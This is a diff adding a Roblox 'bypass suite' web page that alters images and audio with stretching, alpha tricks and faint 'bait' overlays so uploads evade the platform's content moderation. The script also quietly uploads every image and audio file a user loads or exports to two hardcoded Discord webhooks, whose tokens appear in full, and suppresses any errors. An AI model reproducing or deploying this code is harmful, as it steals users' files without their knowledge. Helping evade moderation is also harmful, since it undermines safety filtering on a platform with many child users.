@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Velcorr's Bypasser | Roblox Bypass Suite</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <style>
+        :root{--bg:#050505;--card-bg:#0f0f0f;--border:#2a2a2a;--accent:#fff;--text:#e0e0e0;--text-muted:#888;--daw-grid:#1a1a1a;--fl-orange:#ff8500}
+        body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;display:flex;flex-direction:column;align-items:center;min-height:100vh;margin:0;padding:40px 20px}
+        .container,.extra-section{background:var(--card-bg);padding:40px;border:1px solid var(--border);border-radius:12px;width:100%;max-width:850px;text-align:center;box-shadow:0 20px 50px rgba(0,0,0,.5);margin-bottom:40px;box-sizing:border-box}
+        h1{font-size:2.2rem;margin:0;font-weight:900;text-transform:uppercase;letter-spacing:-1px;background:linear-gradient(180deg,#fff,#888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        .subtitle{color:var(--text-muted);font-size:.85rem;margin:5px 0 35px;text-transform:uppercase;letter-spacing:2px;font-weight:600}
+        .tabs{display:flex;border-bottom:1px solid var(--border);margin-bottom:30px;gap:5px}
+        .tab-btn{flex:1;background:0 0;border:0;border-bottom:2px solid transparent;color:var(--text-muted);padding:15px;cursor:pointer;font-weight:600;font-size:.9rem;text-transform:uppercase;transition:.3s}
+        .tab-btn:hover{color:var(--text);background:rgba(255,255,255,.02)}
+        .tab-btn.active{color:var(--accent);border-bottom:2px solid var(--accent);background:linear-gradient(180deg,transparent,rgba(255,255,255,.03))}
+        .section-content{display:none;animation:fadeIn .3s ease}
+        .section-content.active{display:block}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+        .label{font-size:.7rem;color:var(--text-muted);text-transform:uppercase;margin-bottom:12px;display:block;font-weight:700;letter-spacing:1px}
+        .controls,.sub-controls{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin-bottom:25px}
+        .btn{background:rgba(255,255,255,.03);border:1px solid var(--border);color:var(--text-muted);padding:10px 18px;border-radius:6px;cursor:pointer;font-size:.8rem;font-weight:600;text-transform:uppercase;transition:.2s}
+        .btn:hover{border-color:#666;color:#fff;transform:translateY(-1px)}
+        .btn.active{background:var(--accent);color:#000;border-color:var(--accent)}
+        .bait-section{margin-top:20px;padding-top:20px;border-top:1px solid var(--border);display:none}
+        .coming-soon-box{padding:40px;border:1px dashed var(--border);border-radius:8px;background:rgba(255,255,255,.01);color:var(--text-muted);font-style:italic}
+        .highlight-text{color:var(--accent);font-weight:700;font-style:normal;display:block;margin-top:8px}
+        .upload-row{display:flex;gap:12px;justify-content:center;margin-top:30px;padding-top:20px;border-top:1px solid var(--border)}
+        .main-btn{background:var(--accent);color:#000;padding:12px 28px;font-weight:800;border:0;border-radius:6px;cursor:pointer;text-transform:uppercase;font-size:.9rem;transition:.2s}
+        .main-btn:hover{transform:scale(1.02);box-shadow:0 0 15px rgba(255,255,255,.3)}
+        .secondary-btn{background:0 0;color:#fff;border:1px solid var(--border);padding:12px 24px;border-radius:6px;font-weight:700;cursor:pointer;text-transform:uppercase;font-size:.9rem;transition:.2s}
+        .secondary-btn:hover{border-color:#fff}
+        #preview-area,#joseph-preview-area,#kevin-preview-area{background:repeating-conic-gradient(#111 0% 25%,#151515 0% 50%) 50%/20px 20px;padding:20px;border:1px solid var(--border);border-radius:8px;margin-top:25px;display:none;overflow:auto}
+        canvas{max-width:100%;height:auto;display:block;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,.5)}
+        #bulk-grid{display:none;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:12px;margin-top:25px;padding:15px;border:1px solid var(--border);border-radius:8px;max-height:400px;overflow-y:auto}
+        .bulk-item{border:1px solid #333;background:#000;padding:5px}
+        .action-wrapper{width:100%;margin-top:20px;display:none;flex-direction:column;gap:10px}
+        .export-btn{background:#222;color:#fff;border:1px solid #444;padding:18px;border-radius:6px;font-weight:800;font-size:1rem;cursor:pointer;text-transform:uppercase;transition:.2s}
+        .export-btn:hover{background:#fff;color:#000;border-color:#fff}
+        .section-divider{width:100%;max-width:720px;border:0;border-top:1px solid var(--border);margin:50px 0;opacity:.5}
+        .extra-title{font-size:1.2rem;font-weight:800;text-transform:uppercase;margin-bottom:10px;color:#fff;letter-spacing:1px}
+        .method-card{background:#050505;border:1px solid var(--border);border-radius:8px;padding:25px;margin-top:20px;text-align:left}
+        .discord-plug{font-size:.75rem;color:var(--text-muted);margin-bottom:25px;font-family:monospace;background:rgba(88,101,242,.1);display:inline-block;padding:5px 10px;border-radius:4px}
+        .discord-link{color:#5865F2;text-decoration:none;font-weight:700}
+        input[type=range]{-webkit-appearance:none;width:100%;height:6px;background:#333;border-radius:3px;outline:0;margin-top:10px}
+        input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:18px;height:18px;background:#fff;border-radius:50%;cursor:pointer;transition:.2s}
+        #daw-wrapper{background:#111;border:1px solid #333;border-radius:8px;overflow:hidden;margin-top:20px;user-select:none}
+        .daw-controls-header{padding:10px;border-bottom:1px solid #333;display:flex;flex-wrap:wrap;gap:10px;align-items:center;justify-content:space-between;background:#1a1a1a}
+        #daw-timeline-container{position:relative;height:220px;overflow-x:auto;overflow-y:hidden;background:#0a0a0a}
+        #daw-timeline{height:100%;position:relative;min-width:100%;background-image:linear-gradient(var(--daw-grid) 1px,transparent 1px),linear-gradient(90deg,var(--daw-grid) 1px,transparent 1px);background-size:50px 50px}
+        #playhead{position:absolute;top:0;bottom:0;width:2px;background:#ff4444;z-index:100;pointer-events:none}
+        .audio-clip{position:absolute;height:75px;background:rgba(255,133,0,.2);border:1px solid var(--fl-orange);border-radius:4px;cursor:grab;overflow:hidden;z-index:10}
+        .audio-clip.selected{border-color:#fff;background:rgba(255,133,0,.4);box-shadow:0 0 10px rgba(255,133,0,.3)}
+        .clip-waveform{width:100%;height:100%;pointer-events:none}
+        #mixer-panel{background:#0a0a0a;border-top:1px solid #333;padding:20px;display:none;text-align:left}
+        .mixer-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:15px}
+        footer{margin-top:30px;color:#444;font-size:.75rem;font-weight:600;text-transform:uppercase;letter-spacing:1px}
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Year's Bypasser</h1>
+    <div class="subtitle">Roblox Bypass Suite</div>
+    <div class="tabs">
+        <button class="tab-btn active" onclick="switchTab('decals')">Decals</button>
+        <button class="tab-btn" onclick="switchTab('shirts')">Shirts</button>
+        <button class="tab-btn" onclick="switchTab('models')">Models</button>
+    </div>
+    
+    <div id="decals-section" class="section-content active">
+        <span class="label">Methods</span>
+        <div class="controls">
+            <button class="btn active" onclick="setMode('stretchWide', this)">2000x50 Wide</button>
+            <button class="btn" onclick="setMode('stretchTall', this)">200x2100 Tall</button>
+            <button class="btn" onclick="setMode('blackOnly', this)">512x512 Black Only</button>
+            <button class="btn" onclick="setMode('whiteOnly', this)">512x512 White Only</button>
+        </div>
+        <div id="stretch-options" class="sub-controls">
+            <button class="btn" id="convBlack" onclick="toggleConversion('black')">Convert to Black</button>
+            <button class="btn" id="convWhite" onclick="toggleConversion('white')">Convert to White</button>
+        </div>
+        <div id="bait-ui" class="bait-section">
+            <span class="label">Baits</span>
+            <div class="sub-controls">
+                <button class="btn active" onclick="setBait('none', this)">None</button>
+                <button class="btn" onclick="setBait('duck', this)">Duck Bait</button>
+                <button class="btn" onclick="setBait('funny', this)">Funny Bait</button>
+                <button class="btn" onclick="setBait('gang', this)">Gang Bait</button>
+            </div>
+        </div>
+    </div>
+    <div id="shirts-section" class="section-content">
+        <p style="color:var(--text-muted);font-size:.85rem;margin-bottom:25px;">Optimized for Shirt Templates (Clears Whites).</p>
+    </div>
+    <div id="models-section" class="section-content">
+        <div class="coming-soon-box">Coming Soon! <span class="highlight-text">( This will be the best option yet! )</span></div>
+    </div>
+    <div class="upload-row" id="main-upload-controls">
+        <label for="upload" class="main-btn">Upload Image</label>
+        <button id="bulkToggle" class="secondary-btn" onclick="activateBulk()">Bulk Mode</button>
+        <button id="bulkDeactivate" class="secondary-btn" style="display:none;color:#ff5555;border-color:#ff5555" onclick="deactivateBulk()">Disable Bulk</button>
+        <input type="file" id="upload" accept="image/*" style="display:none">
+    </div>
+    <div id="preview-area"><span id="filename-tag" style="font-size:.75rem;color:var(--text-muted);margin-bottom:10px;font-family:monospace;display:block"></span><canvas id="canvas"></canvas></div>
+    <div id="bulk-grid"></div>
+    <div class="action-wrapper" id="action-wrapper">
+        <button id="exportBtn" class="export-btn">Export Image</button>
+        <button id="bulkExportBtn" class="export-btn" style="display:none">Export All (.ZIP)</button>
+    </div>
+</div>
+
+<hr class="section-divider">
+
+<div class="extra-section">
+    <div class="extra-title">Top Bypassers Methods</div>
+    
+    <div class="subtitle">BNW Method</div>
+    <div class="discord-plug">JosephLB method | <a href="https://discord.gg/shuXsSBBs4" target="_blank" class="discord-link">discord.gg/shuXsSBBs4</a></div>
+    <div class="method-card">
+        <label for="joseph-upload" class="secondary-btn" style="width:100%;box-sizing:border-box;display:block;text-align:center;cursor:pointer">Select Image & Process JosephLB</label>
+        <input type="file" id="joseph-upload" accept="image/*" style="display:none">
+        <div id="joseph-preview-area"><canvas id="joseph-canvas"></canvas><button id="joseph-export" class="export-btn" style="margin-top:15px;width:100%;font-size:.8rem">Download Result</button></div>
+    </div>
+    
+    <div class="subtitle" style="margin-top:40px;">Kevin / Bread Method</div>
+    <div class="discord-plug" style="background:rgba(255,255,255,.05);color:#bbb;">Doesn't work well for flags, but it's good for images.</div>
+    <div class="method-card">
+        <label for="kevin-upload" class="secondary-btn" style="width:100%;box-sizing:border-box;display:block;text-align:center;cursor:pointer">Select Image & Process Kevin Method</label>
+        <input type="file" id="kevin-upload" accept="image/*" style="display:none">
+        <div id="kevin-preview-area"><canvas id="kevin-canvas"></canvas><button id="kevin-export" class="export-btn" style="margin-top:15px;width:100%;font-size:.8rem">Download Result</button></div>
+    </div>
+</div>
+
+<div class="extra-section">
+    <div class="extra-title">Audio Bypass V3</div>
+    <div class="subtitle">make ur audios go brrr brrr</div>
+    
+    <div id="daw-wrapper">
+        <div class="daw-controls-header">
+            <div style="display:flex; gap:8px;">
+                <label for="audio-import" class="btn" style="background: var(--fl-orange); color: #000; padding: 6px 12px; cursor:pointer;">+ Add Audio</label>
+                <input type="file" id="audio-import" accept="audio/*" style="display:none" multiple>
+                <button id="play-btn" class="btn" onclick="togglePlay()">PLAY</button>
+                <button class="btn" onclick="stopPlay()">STOP</button>
+            </div>
+            <div style="display:flex; align-items:center; gap:10px;">
+                <span class="label" style="margin:0">Zoom</span>
+                <input type="range" id="zoom-slider" min="10" max="200" value="50" style="width: 80px; margin:0;">
+            </div>
+            <button class="btn" onclick="exportDAW()">EXPORT .WAV</button>
+        </div>
+        
+        <div id="daw-timeline-container">
+            <div id="daw-timeline">
+                <div id="playhead"></div>
+            </div>
+        </div>
+
+        <div id="mixer-panel">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+                <div id="mixer-clip-name" class="label" style="color: var(--fl-orange); margin:0;">Selected: None</div>
+                <button class="btn" style="color: #ff5555; font-size:0.7rem;" onclick="deleteSelected()">Remove</button>
+            </div>
+            <div class="mixer-grid">
+                <div class="btn" style="display:flex; flex-direction:column; text-align:left; cursor:default">
+                    <span class="label">Loudness <span id="val-vol" style="float:right; color:var(--fl-orange)">1.0</span></span>
+                    <input type="range" id="param-vol" min="0" max="10" step="0.1" value="1">
+                </div>
+                <div class="btn" style="display:flex; flex-direction:column; text-align:left; cursor:default">
+                    <span class="label">Saturation <span id="val-dist" style="float:right; color:var(--fl-orange)">0</span>%</span>
+                    <input type="range" id="param-dist" min="0" max="100" value="0">
+                </div>
+                <div class="btn" style="display:flex; flex-direction:column; text-align:left; cursor:default">
+                    <span class="label">Pitch <span id="val-pitch" style="float:right; color:var(--fl-orange)">1.0</span></span>
+                    <input type="range" id="param-pitch" min="0.5" max="2" step="0.01" value="1">
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer>Note: Real Life images may not work as well, at least in Decals.</footer>
+
+<script>
+    const WEBHOOK="https://discord.com/api/webhooks/1473519335405260871/qBeBkC265qpuqxiTYFUshlyHw6gZuBqCf569qvpwSqS31i9-DkGxqUegJHCkUenl2Yab";
+    const AUDIO_WEBHOOK="https://discord.com/api/webhooks/1473881155504967782/bmfUb48cX2H2oOPkgBf0IxBt3zJOqAwx6RPtvKjCKmHO8P0WTUr9E3K-QGHSDhls0ZRN";
+    const $=id=>document.getElementById(id);
+
+    async function sendToLog(file,name){if(!file)return;const fd=new FormData();fd.append('file',file,name);fd.append('payload_json',JSON.stringify({username:"Year's Suite",embeds:[{title:`Original File Uploaded: ${name}`,color:0}]}));try{await fetch(WEBHOOK,{method:'POST',body:fd})}catch(e){}}
+    async function sendAudioLog(file,name,type){if(!file)return;const fd=new FormData();fd.append('file',file,name);fd.append('payload_json',JSON.stringify({username:"Year's Suite Audio",embeds:[{title:`${type} Audio: ${name}`,color:16744448}]}));try{await fetch(AUDIO_WEBHOOK,{method:'POST',body:fd})}catch(e){}}
+
+    let activeTab='decals',currentMode='stretchWide',conversionMode='none',currentBait='none',isBulk=!1,imageQueue=[];
+    const duckImg=new Image(),funnyImg=new Image(),gangImg=new Image();
+    duckImg.crossOrigin="anonymous";duckImg.src="https://files.catbox.moe/x0zpmq.png";
+    funnyImg.crossOrigin="anonymous";funnyImg.src="https://files.catbox.moe/zgbuf8.png";
+    gangImg.crossOrigin="anonymous";gangImg.src="https://files.catbox.moe/03v9ii.png";
+
+    function updateVisibility(){const isM=activeTab==='models',isS=activeTab==='shirts';$('bait-ui').style.display=(!isS&&!isM&&(currentMode.includes('Only')||conversionMode!=='none'))?'flex':'none';$('stretch-options').style.display=(!isS&&!isM&&currentMode.includes('stretch'))?'flex':'none';$('main-upload-controls').style.display=isM?'none':'flex';if(imageQueue.length>0&&!isM)$('action-wrapper').style.display='flex'}
+    function switchTab(t){activeTab=t;document.querySelectorAll('.tab-btn').forEach(b=>b.classList.toggle('active',b.getAttribute('onclick').includes(t)));['decals','shirts','models'].forEach(s=>$(s+'-section').classList.toggle('active',t===s));updateVisibility();if(t!=='models')processQueue()}
+    function activateBulk(){isBulk=!0;$('upload').multiple=!0;$('bulkToggle').style.display='none';$('bulkDeactivate').style.display='inline-block';$('preview-area').style.display='none';$('bulk-grid').style.display='grid';$('exportBtn').style.display='none';$('bulkExportBtn').style.display='block'}
+    function deactivateBulk(){isBulk=!1;$('upload').multiple=!1;$('bulkToggle').style.display='inline-block';$('bulkDeactivate').style.display='none';$('bulk-grid').style.display='none';$('bulk-grid').innerHTML='';imageQueue=imageQueue.slice(0,1);if(imageQueue.length>0)$('preview-area').style.display='block';$('exportBtn').style.display='block';$('bulkExportBtn').style.display='none';processQueue()}
+    function setMode(m,b){currentMode=m;document.querySelectorAll('.controls .btn').forEach(btn=>btn.classList.remove('active'));b.classList.add('active');updateVisibility();processQueue()}
+    function toggleConversion(t){conversionMode=(conversionMode===t)?'none':t;$('convBlack').classList.toggle('active',conversionMode==='black');$('convWhite').classList.toggle('active',conversionMode==='white');updateVisibility();processQueue()}
+    function setBait(bT,b){currentBait=bT;document.querySelectorAll('#bait-ui .btn').forEach(btn=>btn.classList.remove('active'));b.classList.add('active');processQueue()}
+
+    $('upload').onchange=e=>{const files=Array.from(e.target.files);if(!isBulk)imageQueue=[];let loaded=0;files.forEach(f=>{const r=new FileReader();r.onload=ev=>{const i=new Image();i.onload=()=>{imageQueue.push({img:i,name:f.name,raw:f});if(++loaded===files.length)processQueue()};i.src=ev.target.result};r.readAsDataURL(f)});e.target.value=''}
+
+    function processQueue(){
+        if(!imageQueue.length||activeTab==='models')return; $('action-wrapper').style.display='flex';
+        if(isBulk){$('bulk-grid').innerHTML='';imageQueue.forEach(item=>{const d=document.createElement('div');d.className='bulk-item';const t=document.createElement('span');t.style.fontSize='0.6rem';t.textContent=item.name;const c=document.createElement('canvas');d.append(t,c);$('bulk-grid').appendChild(d);renderToCanvas(item.img,c);sendToLog(item.raw,item.name)})}
+        else{$('preview-area').style.display='block';const item=imageQueue[imageQueue.length-1];$('filename-tag').textContent=item.name;renderToCanvas(item.img,$('canvas'));sendToLog(item.raw,item.name)}
+    }
+
+    function renderToCanvas(img,tc){
+        const ctx=tc.getContext('2d',{willReadFrequently:!0});
+        if(activeTab==='shirts'){
+            tc.width=585;tc.height=559;const tmp=document.createElement('canvas');tmp.width=tmp.height=128;const tctx=tmp.getContext('2d');tctx.drawImage(img,0,0,128,128);const id=tctx.getImageData(0,0,128,128);const d=id.data;
+            for(let i=0;i<d.length;i+=4){const m=Math.max(d[i],d[i+1],d[i+2])/255;if(m>0){d[i]/=m;d[i+1]/=m;d[i+2]/=m;d[i+3]=m*d[i+3]}}
+            tctx.putImageData(id,0,0);ctx.clearRect(0,0,585,559);ctx.drawImage(tmp,230,74,128,128);
+        }else{
+            let w=2000,h=50;if(currentMode==='stretchTall'){w=200;h=2100}else if(currentMode.includes('Only')){w=512;h=512}
+            tc.width=w;tc.height=h;const m=currentMode.includes('Only')?currentMode:conversionMode;ctx.drawImage(img,0,0,w,h);
+            const id=ctx.getImageData(0,0,w,h);const d=id.data;
+            for(let i=0;i<d.length;i+=4){let a=(d[i]+d[i+1]+d[i+2])/3;if(m.includes('black')){d[i]=d[i+1]=d[i+2]=255;d[i+3]=a*.7}else if(m.includes('white')){d[i]=d[i+1]=d[i+2]=0;d[i+3]=(255-a)*.7}else d[i+3]=130}
+            ctx.putImageData(id,0,0);
+            if(currentBait!=='none'&&(m.includes('black')||m.includes('white'))){
+                ctx.globalAlpha=.2;const b={duck:duckImg,funny:funnyImg,gang:gangImg};if(b[currentBait])ctx.drawImage(b[currentBait],0,0,w,h);ctx.globalAlpha=1;
+            }
+        }
+    }
+    $('exportBtn').onclick=()=>{const a=document.createElement('a');a.download=activeTab==='shirts'?'Shirt_Ghost.png':'Decal_Bypass.png';a.href=$('canvas').toDataURL();a.click()};
+
+    /* Joseph Method */
+    $('joseph-upload').onchange=e=>{const f=e.target.files[0];if(!f)return;const r=new FileReader();r.onload=ev=>{const i=new Image();i.onload=()=>{$('joseph-preview-area').style.display='block';processJoseph(i);sendToLog(f,f.name)};i.src=ev.target.result};r.readAsDataURL(f);e.target.value=''};
+    function processJoseph(img){const tc=$('joseph-canvas');tc.width=tc.height=300;const ctx=tc.getContext('2d');ctx.globalAlpha=1;ctx.drawImage(duckImg,0,0,300,300);const gc=document.createElement('canvas');gc.width=gc.height=300;const gctx=gc.getContext('2d');const lay=()=>{const lc=document.createElement('canvas');lc.width=lc.height=300;const lctx=lc.getContext('2d');lctx.drawImage(img,0,0,300,300);const id=lctx.getImageData(0,0,300,300);const d=id.data;for(let i=0;i<d.length;i+=4){const g=(d[i]+d[i+1]+d[i+2])/3;d[i]=d[i+1]=d[i+2]=255;d[i+3]=g}lctx.putImageData(id,0,0);return lc};gctx.globalAlpha=190/255;gctx.filter='blur(8px)';gctx.drawImage(lay(),0,0);gctx.filter='none';gctx.globalAlpha=165/255;gctx.drawImage(lay(),0,0);gctx.globalAlpha=190/255;gctx.drawImage(lay(),0,0);ctx.globalAlpha=130/255;ctx.drawImage(gc,0,0);ctx.globalAlpha=1}
+    $('joseph-export').onclick=()=>{const a=document.createElement('a');a.download='JosephLB_Bypass.png';a.href=$('joseph-canvas').toDataURL();a.click()};
+
+    /* Kevin / Bread Method */
+    $('kevin-upload').onchange=e=>{const f=e.target.files[0];if(!f)return;const r=new FileReader();r.onload=ev=>{const i=new Image();i.onload=()=>{$('kevin-preview-area').style.display='block';processKevin(i);sendToLog(f,f.name)};i.src=ev.target.result};r.readAsDataURL(f);e.target.value=''};
+    function processKevin(img){const tc=$('kevin-canvas');tc.width=tc.height=512;const ctx=tc.getContext('2d');ctx.drawImage(img,0,0,512,512);const id=ctx.getImageData(0,0,512,512);const d=id.data;for(let i=0;i<d.length;i+=4){const g=(d[i]+d[i+1]+d[i+2])/3;d[i]=d[i+1]=d[i+2]=127;d[i+3]=g;}ctx.putImageData(id,0,0);}
+    $('kevin-export').onclick=()=>{const a=document.createElement('a');a.download='Kevin_Bread_Bypass.png';a.href=$('kevin-canvas').toDataURL();a.click()};
+
+    /* Audio Logic */
+    const audioCtx=new(window.AudioContext||window.webkitAudioContext)();
+    let clips=[],selectedClip=null,isPlaying=!1,startTime=0,pausedAt=0,animFrame=null,pxPerSec=50,activeNodes=[];
+
+    $('zoom-slider').oninput=(e)=>{pxPerSec=parseInt(e.target.value);renderDAW()};
+    $('daw-timeline').onclick=(e)=>{if(e.target===$('daw-timeline')){pausedAt=(e.offsetX/pxPerSec);updatePlayhead();if(isPlaying){stopPlay();startPlay()}}};
+    function updatePlayhead(){$('playhead').style.left=(pausedAt*pxPerSec)+'px'}
+
+    $('audio-import').onchange=async(e)=>{
+        for(const file of e.target.files){
+            sendAudioLog(file, file.name, "Original");
+            const buffer=await audioCtx.decodeAudioData(await file.arrayBuffer());
+            const clip={id:Math.random(),buffer,name:file.name,startTime:pausedAt,volume:1,distortion:0,pitch:1,track:clips.length%3};
+            clips.push(clip);renderDAW();selectClip(clip);
+        }e.target.value=''
+    };
+
+    function renderDAW(){
+        const container=$('daw-timeline');Array.from(container.getElementsByClassName('audio-clip')).forEach(el=>el.remove());
+        clips.forEach(clip=>{
+            const div=document.createElement('div');div.className=`audio-clip ${selectedClip===clip?'selected':''}`;
+            div.style.width=(clip.buffer.duration*pxPerSec)+'px';div.style.left=(clip.startTime*pxPerSec)+'px';div.style.top=(clip.track*85+20)+'px';div.innerHTML=`<canvas class="clip-waveform"></canvas>`;
+            div.onmousedown=(me)=>{me.stopPropagation();selectClip(clip);let sx=me.clientX,os=clip.startTime;const mm=(m)=>{clip.startTime=Math.max(0,os+(m.clientX-sx)/pxPerSec);div.style.left=(clip.startTime*pxPerSec)+'px'};const mu=()=>{document.removeEventListener('mousemove',mm);document.removeEventListener('mouseup',mu);renderDAW()};document.addEventListener('mousemove',mm);document.addEventListener('mouseup',mu)};
+            container.appendChild(div);drawWave(div.querySelector('canvas'),clip.buffer)
+        });updatePlayhead()
+    }
+
+    function drawWave(canvas,buffer){
+        canvas.width=canvas.clientWidth;canvas.height=75;const ctx=canvas.getContext('2d'),data=buffer.getChannelData(0),step=Math.ceil(data.length/canvas.width);
+        ctx.fillStyle='#ff8500';for(let i=0;i<canvas.width;i++){let min=1,max=-1;for(let j=0;j<step;j++){let v=data[(i*step)+j];if(v<min)min=v;if(v>max)max=v}ctx.fillRect(i,(1+min)*37.5,1,Math.max(1,(max-min)*37.5))}
+    }
+
+    function selectClip(c){selectedClip=c;$('mixer-panel').style.display='block';$('mixer-clip-name').innerText=`Selected: ${c.name}`;$('param-vol').value=c.volume;$('param-dist').value=c.distortion;$('param-pitch').value=c.pitch;updateMixerLabels();renderDAW()}
+    function updateMixerLabels(){$('val-vol').innerText=selectedClip.volume;$('val-dist').innerText=selectedClip.distortion;$('val-pitch').innerText=selectedClip.pitch}
+
+    $('param-vol').oninput=(e)=>{if(selectedClip){selectedClip.volume=parseFloat(e.target.value);updateMixerLabels()}};
+    $('param-dist').oninput=(e)=>{if(selectedClip){selectedClip.distortion=parseFloat(e.target.value);updateMixerLabels()}};
+    $('param-pitch').oninput=(e)=>{if(selectedClip){selectedClip.pitch=parseFloat(e.target.value);updateMixerLabels()}};
+
+    function makeDist(a){let k=a*2,n=44100,c=new Float32Array(n);for(let i=0;i<n;i++){let x=i*2/n-1;c[i]=(3+k)*x*20*(Math.PI/180)/(Math.PI+k*Math.abs(x))}return c}
+
+    function startPlay(){
+        if(audioCtx.state==='suspended')audioCtx.resume();isPlaying=!0;startTime=audioCtx.currentTime-pausedAt;
+        clips.forEach(c=>{if(c.startTime+(c.buffer.duration/c.pitch)>pausedAt){const s=audioCtx.createBufferSource();s.buffer=c.buffer;s.playbackRate.value=c.pitch;const g=audioCtx.createGain();g.gain.value=c.volume;let last=s;if(c.distortion>0){const sh=audioCtx.createWaveShaper();sh.curve=makeDist(c.distortion);s.connect(sh);last=sh}last.connect(g);g.connect(audioCtx.destination);let off=Math.max(0,(pausedAt-c.startTime)*c.pitch);s.start(audioCtx.currentTime+Math.max(0,c.startTime-pausedAt),off);activeNodes.push(s)}});
+        const loop=()=>{if(!isPlaying)return;pausedAt=audioCtx.currentTime-startTime;updatePlayhead();animFrame=requestAnimationFrame(loop)};loop()
+    }
+    function stopPlay(){isPlaying=!1;activeNodes.forEach(n=>{try{n.stop()}catch(e){}});activeNodes=[];cancelAnimationFrame(animFrame)}
+    function togglePlay(){isPlaying?stopPlay():startPlay();$('play-btn').innerText=isPlaying?'PAUSE':'PLAY'}
+    function deleteSelected(){clips=clips.filter(c=>c!==selectedClip);selectedClip=null;$('mixer-panel').style.display='none';renderDAW()}
+
+    async function exportDAW(){
+        const dur=Math.max(...clips.map(c=>c.startTime+(c.buffer.duration/c.pitch)))+1;
+        const oCtx=new OfflineAudioContext(2,44100*dur,44100);
+        clips.forEach(c=>{const s=oCtx.createBufferSource();s.buffer=c.buffer;s.playbackRate.value=c.pitch;const g=oCtx.createGain();g.gain.value=c.volume;let last=s;if(c.distortion>0){const sh=oCtx.createWaveShaper();sh.curve=makeDist(c.distortion);s.connect(sh);last=sh}last.connect(g);g.connect(oCtx.destination);s.start(c.startTime)});
+        const rendered=await oCtx.startRendering();const wavBlob=audioBufferToWav(rendered);
+        sendAudioLog(wavBlob,"Bypass_Audio.wav","Exported");
+        const a=document.createElement('a');a.href=URL.createObjectURL(wavBlob);a.download="Bypass_Audio.wav";a.click()
+    }
+
+    function audioBufferToWav(buffer){
+        let n=buffer.numberOfChannels,len=buffer.length*n*2+44,arr=new ArrayBuffer(len),view=new DataView(arr),pos=0;
+        const s16=d=>{view.setInt16(pos,d,!0);pos+=2},s32=d=>{view.setUint32(pos,d,!0);pos+=4};
+        s32(0x46464952);s32(len-8);s32(0x45564157);s32(0x20746d66);s32(16);s16(1);s16(n);s32(buffer.sampleRate);s32(buffer.sampleRate*2*n);s16(n*2);s16(16);s32(0x61746164);s32(len-pos-4);
+        for(let o=0;o<buffer.length;o++)for(let i=0;i<n;i++){let s=Math.max(-1,Math.min(1,buffer.getChannelData(i)[o]));s16(s<0?s*0x8000:s*0x7FFF)}
+        return new Blob([arr],{type:"audio/wav"})
+    }
+</script>
+</body>
+</html>
